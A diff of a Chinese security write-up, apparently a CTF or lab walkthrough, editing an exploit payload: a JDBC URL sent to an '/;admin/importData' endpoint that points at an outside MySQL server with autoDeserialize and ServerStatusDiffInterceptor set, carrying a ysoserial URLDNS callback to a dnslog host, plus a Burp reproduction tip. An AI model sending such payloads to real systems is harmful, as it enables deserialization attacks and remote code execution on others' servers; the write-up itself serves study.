@@ -151,7 +151,7 @@ nocache   添加了http返回头
 <img src="https://guokeya.github.io/post-images/1615296867336.png" alt="" loading="lazy"></p>
 <pre><code>/;admin/importData?jdbcUrl=jdbc%3amysql%3a%2f%2f0.0.0.0%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26useUnicode%3dtrue%26useSSL%3dfalse&amp;databaseType=mysql
 
-/;admin/importData?jdbcUrl=jdbc%3amysql%3a%2f%2f119.45.155.77%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26useUnicode%3dtrue%26useSSL%3dfalse%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26autoDeserialize%3dtrue%26user%3dyso_URLDNS_1n4jm9.dnslog.cn&amp;databaseType=mysql
+/;admin/importData?jdbcUrl=jdbc%3amysql%3a%2f%2f119.45.155.77%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26useUnicode%3dtrue%26useSSL%3dfalse%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26autoDeserialize%3dtrue%26user%3dyso_URLDNS_http://1n4jm9.dnslog.cn&amp;databaseType=mysql
 </code></pre>
 <p>我用BURP复现的时候有个坑。就是正常请求。由于要去请求。所以会比较卡。而恶意请求。check过不去就请求比较快。需要把正常请求的进程数调高点</p>
 <h1 id="第三部分filewrite-gadget">第三部分：FileWrite Gadget</h1>
